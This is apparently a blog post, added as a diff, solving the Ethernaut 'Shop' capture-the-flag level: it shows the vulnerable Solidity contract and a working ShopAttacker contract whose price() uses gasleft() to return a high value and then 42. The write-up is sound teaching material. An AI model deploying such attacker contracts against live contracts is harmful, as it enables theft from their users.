@@ -1,0 +1,76 @@
+---
+title: Ethernaut - Shop - Solution
+date: '2024-05-14'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Shop CTF
+---
+
+# Ethernaut - Shop - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();
+        }
+    }
+}
+```
+
+## Exploit
+
+The goal is to get the `buy()` function to set the `price` to a value smaller than 100.
+
+Note that this level is very similar to [Elevator](https://www.marcobesier.xyz/blog/ethernaut-solutions/elevator).
+
+Here, however, we have the additional complication that our `price()` function must be a `view` function.
+In other words, we are not allowed to implement any state-changing logic inside `price()` as we did in the Elevator solution.
+
+Nonetheless, we can still craft a `price()` function that returns different values each time it is called by using `gasleft()`!
+
+In a first attempt, we might try to have `price()` simply returning `gasleft()`, hoping that `gasleft()`'s value will be >= 100 when called the first time and < 100 when called the second time.
+Going with this approach, we will observe that the attack will fail since the value of `gasleft()` after the second call to `price()` is still quite a bit higher than 100.
+After some more experimentation, however, it's easy to subtract a suitable value from `gasleft()` such that `price()` has the desired behaviour.
+
+For example, the following implementation will return a price > 100 when called the first time and a price of 42 when called the second time.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IShop {
+    function buy() external;
+}
+
+contract ShopAttacker {
+    IShop public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = IShop(victim);
+    }
+
+    function attack() external {
+        VICTIM.buy();
+    }
+
+    function price() external view returns (uint256) {
+        return gasleft() - 3714;
+    }
+}
+```
